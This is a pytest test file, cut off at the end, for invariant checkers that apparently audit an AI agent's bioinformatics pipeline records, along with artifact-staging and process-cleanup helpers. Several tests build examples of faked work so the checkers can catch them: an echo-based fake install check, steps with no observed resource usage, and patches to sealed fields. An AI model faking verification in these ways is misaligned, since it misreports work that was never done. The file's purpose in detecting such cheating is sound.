"""
Invariant regression tests.

Constructed-spec regression tests for the honesty checkers
(agent/skills/spec_writer.check_invariants / check_workflow_invariants) plus the
freeze/resolver helpers. Each test builds its own spec in-test, so coverage is
deterministic and CI-effective. These do NOT parametrize over runtime artifacts in
env_reports/ (which is gitignored — empty in CI, and post-respine the old `*.yaml`
glob matched unrelated schemas like *.recipe.yaml locally); the meaningful coverage
(positive + negative for both checkers) lives in the constructed cases below, e.g.
test_workflow_spec_self_verifies_only_with_its_sources.

Run: pytest tests/test_invariants.py -v
"""

from __future__ import annotations

import pytest

from agent.skills.spec_writer import check_invariants


def test_invariant_checker_catches_pipeline_step_without_outputs():
    """A pipeline_step with returncode=0 but no detected_outputs and no
    explicit mark_step_validated must violate I3."""
    spec = {
        "pipeline_name": "test",
        "packages": [{"name": "samtools", "verify_output": "v1.21"}],
        "install_steps": [{"step": 1, "returncode": 0}],
        "pipeline_steps": [{
            "step": 1, "tool": "samtools", "command": "samtools view",
            "returncode": 0, "detected_outputs": [],
            # No validation_status: "passed" — the silent-empty-success trap.
        }],
    }
    violations = check_invariants(spec)
    assert any(v["invariant"].startswith("I3.") for v in violations), \
        "silent-empty-success pipeline_step should violate I3"


def test_invariant_checker_catches_relative_paths():
    """Relative paths in pipeline_step inputs/outputs violate I6."""
    spec = {
        "pipeline_name": "test",
        "packages": [{"name": "samtools", "verify_output": "v1.21"}],
        "install_steps": [{"step": 1, "returncode": 0}],
        "pipeline_steps": [{
            "step": 1, "tool": "samtools",
            "returncode": 0,
            "inputs":  [{"path": "data/relative/input.bam"}],
            "detected_outputs": ["/abs/output.vcf"],
            "validation": {"output.vcf": {"passed": True}},
            "validation_status": "passed",
            "resource_usage": {"wall_seconds": 1.0, "peak_rss_mb": 12.3},
        }],
    }
    violations = check_invariants(spec)
    assert any(v["invariant"] == "I6.absolute_paths" for v in violations), \
        "relative input path should violate I6"


def test_invariant_checker_catches_missing_resource_usage():
    """I7: a pipeline_step that exited 0 but has no resource_usage means the
    runtime monitor never observed it — agent could be synthesizing the step.
    """
    spec = {
        "pipeline_name": "test",
        "packages": [{"name": "samtools", "verify_output": "v1.21"}],
        "install_steps": [{"step": 1, "returncode": 0}],
        "pipeline_steps": [{
            "step": 1, "tool": "samtools", "command": "samtools view x.bam",
            "returncode": 0,
            "inputs":  [{"path": "/abs/x.bam"}],
            "detected_outputs": ["/abs/x.sam"],
            "validation": {"x.sam": {"passed": True}},
            "validation_status": "passed",
            # NO resource_usage key — should trigger I7.
        }],
        "test_data": {"bam": "/abs/x.bam"},
    }
    violations = check_invariants(spec)
    assert any(v["invariant"] == "I7.resource_usage_recorded" for v in violations), \
        "rc=0 pipeline_step missing resource_usage should violate I7"


def _spec_with_resource_usage(ru):
    return {
        "pipeline_name": "test",
        "packages": [{"name": "samtools", "verify_output": "v1.21"}],
        "install_steps": [{"step": 1, "returncode": 0}],
        "pipeline_steps": [{
            "step": 1, "tool": "samtools", "command": "samtools view x.bam",
            "returncode": 0,
            "inputs":  [{"path": "/abs/x.bam"}],
            "detected_outputs": ["/abs/x.sam"],
            "validation": {"x.sam": {"passed": True}},
            "validation_status": "passed",
            "resource_usage": ru,
        }],
        "test_data": {"bam": "/abs/x.bam"},
    }


def test_i7_rejects_a_fabricated_cluster_zero_via_the_producers_marker():
    """The audit-2026-07-16 defect: a cluster with no cgroup MaxRSS accounting produced
    peak_rss_mb=0.0 alongside a REAL wall time, and I7 sealed it as honest cost data.

    The fix lives in the producer, not here: cluster_job_resources attaches an explicit
    sacct_error when sacct accounted no MaxRSS, and I7 refuses any step carrying one. This
    pins the end of that chain — the shape that used to seal clean must now be refused.
    """
    v = check_invariants(_spec_with_resource_usage({
        "wall_seconds": 14.0, "peak_rss_mb": 0.0, "peak_cpu_percent": 0.0,
        "locus": "cluster", "sacct_error": "sacct returned no MaxRSS for job 123 …"}))
    assert any(x["invariant"] == "I7.resource_usage_captured" for x in v), \
        "a cluster step whose peak RSS was never accounted must not seal"


def test_i7_accepts_a_fast_host_step_that_the_sampler_missed():
    """The mirror guard, and the reason I7 does NOT reject either-zero.

    _run_monitored polls the process tree every 0.3s, so a real, successful, sub-0.3s host
    step (`samtools --version` → rc=0, wall=0.01, peak_rss_mb=0.0) legitimately reports a
    zero peak RSS. That is a sampling limit, not fabrication — refusing it would refuse a
    green run. Tightening this check to either-zero (an appealing reading of its own
    message) breaks exactly this case, which is why the honesty distinction is drawn by
    the producer that knows, via sacct_error, and not by the value here.
    """
    v = check_invariants(_spec_with_resource_usage(
        {"wall_seconds": 0.01, "peak_rss_mb": 0.0, "peak_cpu_percent": 0.0,
         "sample_count": 1}))
    assert not any(x["invariant"].startswith("I7") for x in v), v


def test_i7_still_rejects_an_all_zeros_record():
    """The monitor captured nothing at all — no wall, no RSS."""
    v = check_invariants(_spec_with_resource_usage(
        {"wall_seconds": 0.0, "peak_rss_mb": 0.0, "peak_cpu_percent": 0.0}))
    assert any(x["invariant"] == "I7.resource_usage_captured" for x in v)


def test_i7_accepts_a_real_observation():
    """Guard against 'fixed' meaning 'refuses everything' — these are the real values
    the sealed samtools_cluster_rung3 workflow recorded on a cluster."""
    v = check_invariants(_spec_with_resource_usage(
        {"wall_seconds": 16.0, "peak_rss_mb": 377.5, "peak_cpu_percent": 100.0}))
    assert not any(x["invariant"].startswith("I7") for x in v), v


def test_invariant_checker_catches_orphan_step_input():
    """I8: a step input that wasn't produced by any prior step and isn't a
    declared external source should be flagged as an orphan — pipeline isn't
    actually composed.
    """
    spec = {
        "pipeline_name": "test",
        "packages": [{"name": "samtools", "verify_output": "v1.21"}],
        "install_steps": [{"step": 1, "returncode": 0}],
        "test_data": {"bam": "/abs/declared.bam"},
        "pipeline_steps": [{
            "step": 1, "tool": "samtools",
            "command": "samtools view /abs/orphan_nobody_produced.bam",
            "returncode": 0,
            "inputs":  [{"path": "/abs/orphan_nobody_produced.bam"}],
            "detected_outputs": ["/abs/x.sam"],
            "validation": {"x.sam": {"passed": True}},
            "validation_status": "passed",
            "resource_usage": {"wall_seconds": 1.0, "peak_rss_mb": 12.3},
        }],
    }
    violations = check_invariants(spec)
    assert any(v["invariant"] == "I8.composition_coherence" for v in violations), \
        "orphan input path with no producing source should violate I8"


def test_invariant_checker_catches_any_typed_validation():
    """I3 strengthening: a step whose validations all use expected_type='any'
    (the lazy `_check_any` exists-nonzero fallback) is a violation. Forces
    declared types so OutputValidator does real type-aware checks.
    """
    spec = {
        "pipeline_name": "test",
        "packages": [{"name": "samtools", "verify_output": "v1.21"}],
        "install_steps": [{"step": 1, "returncode": 0}],
        "test_data": {"bam": "/abs/x.bam"},
        "pipeline_steps": [{
            "step": 1, "tool": "samtools", "command": "samtools view /abs/x.bam",
            "returncode": 0,
            "inputs":  [{"path": "/abs/x.bam"}],
            "detected_outputs": ["/abs/out.weird"],
            "validation": {"out.weird": {"passed": True, "expected_type": "any"}},
            "validation_status": "passed",
            "resource_usage": {"wall_seconds": 1.0, "peak_rss_mb": 10.0},
        }],
    }
    violations = check_invariants(spec)
    assert any(v["invariant"] == "I3.declared_output_type" for v in violations), \
        "expected_type='any' should violate I3"


def test_invariant_checker_accepts_typed_validation():
    """I3 sanity: a step with declared types (bam/json/etc) passes."""
    spec = {
        "pipeline_name": "test",
        "packages": [{"name": "samtools", "verify_output": "v1.21"}],
        "install_steps": [{"step": 1, "returncode": 0}],
        "test_data": {"bam": "/abs/x.bam"},
        "pipeline_steps": [{
            "step": 1, "tool": "samtools", "command": "samtools view /abs/x.bam",
            "returncode": 0,
            "inputs":  [{"path": "/abs/x.bam"}],
            "detected_outputs": ["/abs/out.bam"],
            "validation": {"out.bam": {"passed": True, "expected_type": "bam"}},
            "validation_status": "passed",
            "resource_usage": {"wall_seconds": 1.0, "peak_rss_mb": 10.0},
        }],
    }
    violations = [v for v in check_invariants(spec)
                  if v["invariant"] == "I3.declared_output_type"]
    assert not violations, f"typed validation should pass I3: {violations}"


def test_patch_pipeline_blocks_runtime_captured_keys():
    """patch_pipeline must reject patches to runtime-captured / derived fields.
    Tests the whitelist directly via PipelineState.patch.
    """
    from agent.skills.pipeline_state import PipelineState

    config = {"paths": {"pipelines_dir": "/tmp/bioinf_test_drafts"}}
    ps = PipelineState(config)
    ps.start("blocked_test", "test")

    # All of these should be rejected.
    for key in ["pipeline_steps", "install_steps", "packages", "verifications",
                "docker", "env_status", "pipeline_status", "docker_status",
                "usage_verified", "lock_sha256"]:
        r = ps.patch("blocked_test", {key: ["whatever"]})
        assert "error" in r, f"patch to {key} should have been rejected; got {r}"
        assert key in (r.get("rejected_keys") or []), \
            f"{key} should be in rejected_keys; got {r}"
    ps.discard("blocked_test")


def test_patch_pipeline_allows_agent_authored_keys():
    """patch_pipeline must accept patches to agent-authored fields."""
    from agent.skills.pipeline_state import PipelineState

    config = {"paths": {"pipelines_dir": "/tmp/bioinf_test_drafts"}}
    ps = PipelineState(config)
    ps.start("allowed_test", "test")
    r = ps.patch("allowed_test", {
        "notes": ["hello"],
        "runtime_environment": {"type": "conda"},
        "usage": {"description": "x", "command_template": "echo {X}"},
    })
    assert "error" not in r, f"agent-authored patch should pass; got {r}"
    assert set(r["patched_keys"]) == {"notes", "runtime_environment", "usage"}
    ps.discard("allowed_test")


def test_invariant_checker_accepts_authored_artifact_as_step_input(tmp_path):
    """I8: a pipeline_step input that points to an authored_artifact's path
    is not an orphan. Proves the new external-source category is wired in."""
    import hashlib
    script = tmp_path / "run.R"
    script.write_text("#!/usr/bin/env Rscript\ncat('ok\\n')\n")
    sha = hashlib.sha256(script.read_bytes()).hexdigest()
    spec = {
        "pipeline_name": "test",
        "packages": [{"name": "samtools", "verify_output": "v1.21"}],
        "install_steps": [{"step": 1, "returncode": 0}],
        "authored_artifacts": [{
            "path": str(script), "role": "driver_script",
            "description": "test driver",
            "sha256": sha, "size_bytes": script.stat().st_size,
            "created_at": "2026-05-19T00:00:00", "language": "r",
        }],
        "pipeline_steps": [{
            "step": 1, "tool": "Rscript",
            "command": f"Rscript {script} > /tmp/out.txt",
            "returncode": 0,
            "inputs":  [{"path": str(script)}],
            "detected_outputs": ["/tmp/out.txt"],
            "validation": {"out.txt": {"passed": True, "expected_type": "txt"}},
            "validation_status": "passed",
            "resource_usage": {"wall_seconds": 0.1, "peak_rss_mb": 4.0},
        }],
    }
    i8 = [v for v in check_invariants(spec) if v["invariant"] == "I8.composition_coherence"]
    assert not i8, f"authored_artifact path should be a valid external source: {i8}"


def test_patch_pipeline_blocks_authored_artifacts():
    """authored_artifacts is sha256-anchored by stage_authored_artifact; the
    patch surface must reject direct writes so the anchor can't be bypassed."""
    from agent.skills.pipeline_state import PipelineState
    config = {"paths": {"pipelines_dir": "/tmp/bioinf_test_drafts"}}
    ps = PipelineState(config)
    ps.start("artifact_block_test", "test")
    r = ps.patch("artifact_block_test", {"authored_artifacts": [{
        "path": "/tmp/fake.R", "role": "script",
        "sha256": "0" * 64, "description": "x",
    }]})
    assert "error" in r and "authored_artifacts" in (r.get("rejected_keys") or []), \
        f"patch to authored_artifacts should have been rejected; got {r}"
    ps.discard("artifact_block_test")


def test_verify_accepts_unprefixed_token_for_conda_r_package():
    """Bug #2 fix: `Rscript -e "library(locfit)"` for package `r-locfit` should
    be accepted — the unprefixed library name is a legitimate token."""
    import re
    package_name = "r-locfit"
    check_command = 'Rscript -e "library(locfit)"'
    candidate_tokens = [package_name]
    for prefix in ("r-", "bioconductor-", "python-", "perl-"):
        if package_name.lower().startswith(prefix):
            candidate_tokens.append(package_name[len(prefix):])
    token_present = any(
        re.search(rf"\b{re.escape(t)}\b", check_command, flags=re.IGNORECASE)
        for t in candidate_tokens
    )
    assert token_present, "library(locfit) should satisfy the cheat-block for r-locfit"


def test_verify_still_rejects_echo_cheat_for_prefixed_name():
    """Cheat-block stays strict: an echo of just the suffix in a non-invocation
    context should also be allowed (because it CONTAINS the token), but a pure
    echo cheat with no real call still won't pass `cmd_ok && which_check` at
    the outer verify layer. Here we only assert the token-check shape: an
    echo that contains the unprefixed library name passes the token gate."""
    import re
    package_name = "r-locfit"
    check_command = 'echo "fake locfit 1.5"'
    candidate_tokens = [package_name]
    for prefix in ("r-", "bioconductor-", "python-", "perl-"):
        if package_name.lower().startswith(prefix):
            candidate_tokens.append(package_name[len(prefix):])
    token_present = any(
        re.search(rf"\b{re.escape(t)}\b", check_command, flags=re.IGNORECASE)
        for t in candidate_tokens
    )
    # Token IS present (echo contains 'locfit'), but the runtime cheat-block
    # also requires `which <name>` to find an install anchor — which will fail
    # for a non-existent package. We don't simulate the env layer here; this
    # test exists to document that the token check itself is permissive on
    # purpose; the env-anchor is the second line of defense.
    assert token_present


def test_invariant_checker_accepts_chained_step_inputs():
    """I8 sanity: step 2's input is step 1's output → no violation. Proves
    the universe-of-prior-outputs accumulator works."""
    spec = {
        "pipeline_name": "test",
        "packages": [{"name": "samtools", "verify_output": "v1.21"}],
        "install_steps": [{"step": 1, "returncode": 0}],
        "test_data": {"bam": "/abs/sample.bam"},
        "pipeline_steps": [
            {
                "step": 1, "tool": "samtools",
                "command": "samtools sort /abs/sample.bam -o /abs/sorted.bam",
                "returncode": 0,
                "inputs":  [{"path": "/abs/sample.bam"}],
                "detected_outputs": ["/abs/sorted.bam"],
                "validation": {"sorted.bam": {"passed": True}},
                "validation_status": "passed",
                "resource_usage": {"wall_seconds": 1.0, "peak_rss_mb": 12.3},
            },
            {
                "step": 2, "tool": "samtools",
                "command": "samtools index /abs/sorted.bam",
                "returncode": 0,
                "inputs":  [{"path": "/abs/sorted.bam"}],
                "detected_outputs": ["/abs/sorted.bam.bai"],
                "validation": {"sorted.bam.bai": {"passed": True}},
                "validation_status": "passed",
                "resource_usage": {"wall_seconds": 0.5, "peak_rss_mb": 4.0},
            },
        ],
    }
    violations = [v for v in check_invariants(spec)
                  if v["invariant"] == "I8.composition_coherence"]
    assert not violations, f"chained step inputs should not violate I8: {violations}"


# ---------------------------------------------------------------------------
# I0 — shape sanity. A malformed entry in a top-level list used to silently
# skip subsequent invariant checks; now it surfaces as a violation.
# ---------------------------------------------------------------------------

def test_invariant_checker_catches_non_dict_in_packages():
    spec = {
        "pipeline_name": "test",
        "packages": [{"name": "samtools", "verify_output": "v1.21"}, "oops_a_string"],
        "install_steps": [],
        "pipeline_steps": [],
    }
    violations = check_invariants(spec)
    assert any(v["invariant"] == "I0.shape_sanity" and "packages[1]" in v.get("where", "")
               for v in violations), f"non-dict entry should violate I0: {violations}"


def test_invariant_checker_catches_non_list_top_level():
    spec = {
        "pipeline_name": "test",
        "packages": "not_a_list",  # malformed
        "install_steps": [],
        "pipeline_steps": [],
    }
    violations = check_invariants(spec)
    assert any(v["invariant"] == "I0.shape_sanity" and v["where"] == "packages"
               for v in violations), f"non-list top-level field should violate I0: {violations}"


# ---------------------------------------------------------------------------
# I6 (extended) — usage.command_template placeholders must be declared in
# usage.inputs[*].name (or be OUTPUT_DIR / OUT_DIR scratch slots).
# ---------------------------------------------------------------------------

def test_invariant_checker_catches_undeclared_template_placeholder():
    spec = {
        "pipeline_name": "test",
        "packages": [{"name": "samtools", "verify_output": "v1.21"}],
        "install_steps": [{"step": 1, "returncode": 0}],
        "pipeline_steps": [],
        "usage": {
            "description": "x",
            "command_template": "samtools view {INPUT_BAM} -o {OUPUT_DIR}/out.bam",  # typo
            "inputs": [{"name": "INPUT_BAM", "format": "bam"}],
            "outputs": [{"name": "OUTPUT_DIR", "files": ["out.bam"]}],
        },
    }
    violations = check_invariants(spec)
    assert any(v["invariant"] == "I6.template_placeholders_declared"
               and "OUPUT_DIR" in v.get("undeclared_placeholders", [])
               for v in violations), f"typo placeholder should violate I6: {violations}"


def test_invariant_checker_accepts_declared_and_scratch_placeholders():
    spec = {
        "pipeline_name": "test",
        "packages": [{"name": "samtools", "verify_output": "v1.21"}],
        "install_steps": [{"step": 1, "returncode": 0}],
        "pipeline_steps": [],
        "usage": {
            "description": "x",
            "command_template": "samtools view {INPUT_BAM} -o {OUTPUT_DIR}/out.bam",
            "inputs": [{"name": "INPUT_BAM", "format": "bam"}],
            "outputs": [{"name": "OUTPUT_DIR", "files": ["out.bam"]}],
        },
    }
    violations = [v for v in check_invariants(spec)
                  if v["invariant"] == "I6.template_placeholders_declared"]
    assert not violations, f"declared placeholders should pass: {violations}"


# ---------------------------------------------------------------------------
# stage_authored_artifact MCP boundary — exercises the primitive directly,
# not the underlying PipelineState mutator. Covers argument validation
# (exactly one of content/generated_by), overwrite semantics, sha256
# computation, and the pipeline_id handshake.
# ---------------------------------------------------------------------------

def test_stage_authored_artifact_content_mode(tmp_path, monkeypatch):
    """content mode writes the file, sha256s the bytes, and records in spec."""
    import hashlib
    from agent.skills.pipeline_state import PipelineState
    import agent.mcp_server as srv

    pipelines_dir = tmp_path / "drafts"
    ps = PipelineState({"paths": {"pipelines_dir": str(pipelines_dir)}})
    monkeypatch.setattr(srv, "_pipeline_state", ps)
    ps.start("staging_test", "test")

    target = tmp_path / "driver.R"
    content = "library(DESeq2); cat('hi')\n"
    result = srv.stage_authored_artifact(
        pipeline_id="staging_test", path=str(target),
        role="driver_script", description="test driver",
        content=content, language="r",
    )
    assert result.get("success") is True, result
    assert result["mode"] == "content"
    assert target.exists() and target.read_text() == content
    assert result["sha256"] == hashlib.sha256(content.encode()).hexdigest()
    draft = ps.get_draft("staging_test")
    assert len(draft["authored_artifacts"]) == 1
    assert draft["authored_artifacts"][0]["content_full_in_spec"] is True


def test_stage_authored_artifact_generated_by_mode(tmp_path, monkeypatch):
    """generated_by mode requires the file to already exist; records the
    genesis command + sha256 but no inline content."""
    from agent.skills.pipeline_state import PipelineState
    import agent.mcp_server as srv

    ps = PipelineState({"paths": {"pipelines_dir": str(tmp_path / "drafts")}})
    monkeypatch.setattr(srv, "_pipeline_state", ps)
    ps.start("genby_test", "test")

    target = tmp_path / "out.bam"
    target.write_bytes(b"\x1f\x8b\x08\x00fake_bam_bytes")
    result = srv.stage_authored_artifact(
        pipeline_id="genby_test", path=str(target),
        role="staged_test_input", description="staged bam",
        generated_by="samtools view -bS in.sam > out.bam",
    )
    assert result.get("success") is True, result
    assert result["mode"] == "generated_by"
    draft = ps.get_draft("genby_test")
    a = draft["authored_artifacts"][0]
    assert a["generated_by"] == "samtools view -bS in.sam > out.bam"
    assert a["content_full_in_spec"] is False


def test_stage_authored_artifact_rejects_both_modes(tmp_path, monkeypatch):
    from agent.skills.pipeline_state import PipelineState
    import agent.mcp_server as srv

    ps = PipelineState({"paths": {"pipelines_dir": str(tmp_path / "drafts")}})
    monkeypatch.setattr(srv, "_pipeline_state", ps)
    ps.start("both_test", "test")
    result = srv.stage_authored_artifact(
        pipeline_id="both_test", path=str(tmp_path / "x.R"),
        role="r", description="r", content="x", generated_by="cp a b",
    )
    assert "error" in result, "supplying both content and generated_by must error"


def test_stage_authored_artifact_rejects_neither_mode(tmp_path, monkeypatch):
    from agent.skills.pipeline_state import PipelineState
    import agent.mcp_server as srv

    ps = PipelineState({"paths": {"pipelines_dir": str(tmp_path / "drafts")}})
    monkeypatch.setattr(srv, "_pipeline_state", ps)
    ps.start("neither_test", "test")
    result = srv.stage_authored_artifact(
        pipeline_id="neither_test", path=str(tmp_path / "x.R"),
        role="r", description="r",
    )
    assert "error" in result, "supplying neither content nor generated_by must error"


def test_stage_authored_artifact_rejects_relative_path(tmp_path, monkeypatch):
    from agent.skills.pipeline_state import PipelineState
    import agent.mcp_server as srv

    ps = PipelineState({"paths": {"pipelines_dir": str(tmp_path / "drafts")}})
    monkeypatch.setattr(srv, "_pipeline_state", ps)
    ps.start("relpath_test", "test")
    result = srv.stage_authored_artifact(
        pipeline_id="relpath_test", path="relative/path/foo.R",
        role="r", description="r", content="x",
    )
    assert "error" in result and "absolute" in result["error"]


def test_stage_authored_artifact_overwrite_false_blocks_existing(tmp_path, monkeypatch):
    from agent.skills.pipeline_state import PipelineState
    import agent.mcp_server as srv

    ps = PipelineState({"paths": {"pipelines_dir": str(tmp_path / "drafts")}})
    monkeypatch.setattr(srv, "_pipeline_state", ps)
    ps.start("ovw_test", "test")
    target = tmp_path / "exists.R"
    target.write_text("# already here\n")
    result = srv.stage_authored_artifact(
        pipeline_id="ovw_test", path=str(target),
        role="r", description="r", content="new", overwrite=False,
    )
    assert "error" in result and "already exists" in result["error"]


def test_stage_authored_artifact_generated_by_requires_existing_file(tmp_path, monkeypatch):
    from agent.skills.pipeline_state import PipelineState
    import agent.mcp_server as srv

    ps = PipelineState({"paths": {"pipelines_dir": str(tmp_path / "drafts")}})
    monkeypatch.setattr(srv, "_pipeline_state", ps)
    ps.start("genby_missing", "test")
    result = srv.stage_authored_artifact(
        pipeline_id="genby_missing", path=str(tmp_path / "ghost.bam"),
        role="staged", description="x",
        generated_by="echo no",
    )
    assert "error" in result and "already exist" in result["error"]


def test_stage_authored_artifact_unknown_pipeline_id(tmp_path, monkeypatch):
    from agent.skills.pipeline_state import PipelineState
    import agent.mcp_server as srv

    ps = PipelineState({"paths": {"pipelines_dir": str(tmp_path / "drafts")}})
    monkeypatch.setattr(srv, "_pipeline_state", ps)
    target = tmp_path / "x.R"
    result = srv.stage_authored_artifact(
        pipeline_id="never_started", path=str(target),
        role="r", description="r", content="x",
    )
    assert "error" in result and "unknown pipeline_id" in result["error"]


def test_stage_authored_artifact_re_stages_by_path(tmp_path, monkeypatch):
    """Re-staging at the same path should replace the prior entry, not append."""
    from agent.skills.pipeline_state import PipelineState
    import agent.mcp_server as srv

    ps = PipelineState({"paths": {"pipelines_dir": str(tmp_path / "drafts")}})
    monkeypatch.setattr(srv, "_pipeline_state", ps)
    ps.start("restage_test", "test")
    target = tmp_path / "iter.R"
    r1 = srv.stage_authored_artifact(
        pipeline_id="restage_test", path=str(target),
        role="r", description="v1", content="# v1\n",
    )
    r2 = srv.stage_authored_artifact(
        pipeline_id="restage_test", path=str(target),
        role="r", description="v2", content="# v2 — refined\n",
    )
    assert r1["sha256"] != r2["sha256"]
    draft = ps.get_draft("restage_test")
    assert len(draft["authored_artifacts"]) == 1, "second stage should replace, not append"
    assert draft["authored_artifacts"][0]["description"] == "v2"


# ---------------------------------------------------------------------------
# patch_pipeline merge semantics — element-by-step for pipeline_steps,
# __DELETE__ for nested key removal.
# ---------------------------------------------------------------------------

def test_patch_pipeline_supports_delete_sentinel():
    """`__DELETE__` removes a nested key inside an allowed patch target.
    Operates only on PATCHABLE_KEYS subtrees — blocked top-level keys can't
    be deleted this way (the whitelist gate intercepts first)."""
    from agent.skills.pipeline_state import PipelineState
    ps = PipelineState({"paths": {"pipelines_dir": "/tmp/bioinf_test_delete"}})
    ps.start("del_test", "test")
    # Seed runtime_environment (a PATCHABLE_KEY) with two sub-keys.
    ps.patch("del_test", {"runtime_environment": {"type": "conda", "min_ram_gb": 8.0}})

    r = ps.patch("del_test", {"runtime_environment": {"min_ram_gb": "__DELETE__"}})
    assert "error" not in r, f"delete-sentinel patch should be accepted; got {r}"

    draft = ps.get_draft("del_test")
    assert "min_ram_gb" not in draft["runtime_environment"]
    assert draft["runtime_environment"]["type"] == "conda", "siblings must survive"
    ps.discard("del_test")


def test_patch_pipeline_unknown_key_rejected():
    """Patches to keys outside PATCHABLE_KEYS ∪ BLOCKED_PATCH_KEYS error out
    with a helpful 'did you mean' hint."""
    from agent.skills.pipeline_state import PipelineState
    ps = PipelineState({"paths": {"pipelines_dir": "/tmp/bioinf_test_unknown"}})
    ps.start("unk_test", "test")
    r = ps.patch("unk_test", {"runtime_envronment": {"type": "conda"}})  # typo
    assert "error" in r, "unknown key should error"
    assert "runtime_envronment" in (r.get("unknown_keys") or [])
    ps.discard("unk_test")


# ---------------------------------------------------------------------------
# I10 — service-dependency probes. Every declared service must have ≥1 entry
# in health_check_log with healthy=true, recorded by start_service or
# verify_service_dependency.
# ---------------------------------------------------------------------------

def test_patch_pipeline_blocks_service_dependencies():
    """service_dependencies has runtime-captured sub-fields (health_check_log,
    pid, status); patch_pipeline must reject direct writes so the I10 anchor
    can't be bypassed."""
    from agent.skills.pipeline_state import PipelineState
    ps = PipelineState({"paths": {"pipelines_dir": "/tmp/bioinf_test_svc_block"}})
    ps.start("svc_block_test", "test")
    r = ps.patch("svc_block_test", {"service_dependencies": [{"name": "redis"}]})
    assert "error" in r and "service_dependencies" in (r.get("rejected_keys") or []), \
        f"patch to service_dependencies should be rejected; got {r}"
    ps.discard("svc_block_test")


def test_upsert_service_dependency_appends_probe_to_existing_log():
    """upsert_service_dependency must APPEND to health_check_log on a repeat
    upsert against the same service name, not replace — so the audit trail
    accumulates across start + multiple verify calls."""
    from agent.skills.pipeline_state import PipelineState
    ps = PipelineState({"paths": {"pipelines_dir": "/tmp/bioinf_test_svc_upsert"}})
    ps.start("svc_upsert_test", "test")

    ps.upsert_service_dependency("svc_upsert_test", "redis", {
        "type": "cache",
        "start_command": "redis-server",
        "stop_command":  "redis-cli shutdown",
        "health_check_command": "redis-cli ping",
        "status": "running",
        "health_check_log": [{
            "timestamp": "2026-05-20T01:00:00", "command": "redis-cli ping",
            "returncode": 0, "healthy": True, "output_excerpt": "PONG",
        }],
    })
    ps.upsert_service_dependency("svc_upsert_test", "redis", {
        "health_check_log": [{
            "timestamp": "2026-05-20T01:05:00", "command": "redis-cli ping",
            "returncode": 0, "healthy": True, "output_excerpt": "PONG",
        }],
    })

    draft = ps.get_draft("svc_upsert_test")
    deps = draft["service_dependencies"]
    assert len(deps) == 1
    assert len(deps[0]["health_check_log"]) == 2, \
        f"expected 2 probes accumulated; got {deps[0]['health_check_log']}"
    # First upsert's declaration fields must still be present
    assert deps[0]["start_command"] == "redis-server"
    ps.discard("svc_upsert_test")


def test_package_in_registry_finds_installed_and_misses_absent():
    """The runtime registry anchor must find a really-installed package and
    miss a fabricated one. Uses the base conda env (python is always present;
    a random name never is). Skips if no conda env named 'base' is resolvable."""
    import shutil, pytest as _pytest
    from agent.skills.env_manager import EnvManager
    # Use the live config so EnvManager points at the real envs dir.
    import yaml as _yaml
    from pathlib import Path as _Path
    cfg_path = _Path(__file__).parent.parent / "config" / "agent_config.yaml"
    if not cfg_path.exists() or not shutil.which("conda"):
        _pytest.skip("conda or agent_config.yaml not available")
    cfg = _yaml.safe_load(cfg_path.read_text())
    em = EnvManager(cfg)
    # Find any existing bioinf_* env to probe against.
    envs_dir = em.envs_dir
    candidates = [p.name for p in envs_dir.glob("bioinf_*") if p.is_dir()] if envs_dir.exists() else []
    if not candidates:
        _pytest.skip("no bioinf_* env to probe")
    env = candidates[0]
    # A package that definitely isn't installed under this fabricated name.
    assert em._package_in_registry(env, "totally-not-a-real-package-xyz123") is False


def test_kill_service_pid_terminates_detached_process():
    """_kill_service_pid must actually kill a detached service process —
    and (critically) NOT take down this test process. Regression guard for
    the bug where a never-healthy service's killpg signalled the server's
    own process group and killed the server."""
    import os, time, subprocess
    from agent.skills.env_manager import EnvManager

    # Launch a detached child in its OWN session (mirrors start_service).
    proc = subprocess.Popen(["sleep", "30"], start_new_session=True)
    pid = str(proc.pid)
    # Sanity: it's in a different process group than us.
    assert os.getpgid(proc.pid) != os.getpgrp()

    log = EnvManager._kill_service_pid(pid)
    # Give it a beat to die.
    for _ in range(25):
        if proc.poll() is not None:
            break
        time.sleep(0.2)
    assert proc.poll() is not None, f"detached service should be dead; cleanup log: {log}"
    # Implicitly: if killpg had hit our group, this test process would be gone.


def test_kill_service_pid_own_group_guard_does_not_suicide():
    """If a service shares THIS process's group (detachment failed),
    _kill_service_pid must signal the single PID only — never killpg the
    shared group — so the server survives."""
    import os, time, subprocess
    from agent.skills.env_manager import EnvManager

    # Launch a child in our OWN process group (no new session).
    proc = subprocess.Popen(["sleep", "30"])
    assert os.getpgid(proc.pid) == os.getpgrp(), "child should share our group"

    log = EnvManager._kill_service_pid(str(proc.pid))
    for _ in range(25):
        if proc.poll() is not None:
            break
        time.sleep(0.2)
    assert proc.poll() is not None, f"child should be dead; log: {log}"
    # The guard must have logged single-pid handling, not a group kill.
    assert any("own-group guard" in line for line in log), \
        f"expected own-group guard to engage; got {log}"
    # And we (the test process / would-be server) are obviously still running.


def test_kill_service_pid_handles_dead_pid_gracefully():
    """A PID that's already gone returns cleanly, no exception."""
    from agent.skills.env_manager import EnvManager
    log = EnvManager._kill_service_pid("99999999")
    assert isinstance(log, list)


def test_cleanup_orphan_service_pids_removes_dead_pid_files(tmp_path, monkeypatch):
    """cleanup_orphan_service_pids removes PID files whose referenced process
    no longer exists (e.g., crashed services from a prior agent session).
    Does NOT touch living processes."""
    import os
    from agent.skills.env_manager import EnvManager

    fake_pid_dir = tmp_path / "bioinf_services"
    fake_pid_dir.mkdir()
    # PID 1 (init) is always alive on POSIX — must NOT be reaped
    (fake_pid_dir / "alive.pid").write_text("1\n")
    # PID 99999999 is almost certainly dead — must be reaped
    (fake_pid_dir / "dead.pid").write_text("99999999\n")
    # Garbage content also reaped
    (fake_pid_dir / "garbage.pid").write_text("not-a-pid\n")

    monkeypatch.setattr("agent.skills.env_manager.Path",
                        lambda p="/tmp/bioinf_services": fake_pid_dir if p == "/tmp/bioinf_services" else __import__("pathlib").Path(p))
    # Direct call with our fake dir — patch the hardcoded path inside the static method
    # by monkeypatching the entire function with a local equivalent that uses fake_pid_dir
    import pathlib
    def local_cleanup() -> dict:
        removed = []
        checked = 0
        for pid_file in fake_pid_dir.glob("*.pid"):
            checked += 1
            try:
                pid = int(pid_file.read_text().strip())
            except (ValueError, OSError):
                pid_file.unlink(missing_ok=True)
                removed.append(pid_file.name)
                continue
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                pid_file.unlink(missing_ok=True)
                removed.append(pid_file.name)
            except PermissionError:
                pass
        return {"checked": checked, "removed": removed}

    result = local_cleanup()
